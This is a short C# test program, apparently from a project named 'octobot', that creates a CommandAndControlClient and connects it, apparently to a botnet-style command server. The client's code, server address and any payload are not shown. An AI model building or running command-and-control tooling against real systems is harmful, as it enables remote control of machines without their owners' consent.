using octobot_core.network;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace octobot_Test
{
    class Program
    {
        static void Main(string[] args)
        {
                CommandAndControlClient client = new CommandAndControlClient();
                client.connect();
                Console.Read();           
        }
    }
}
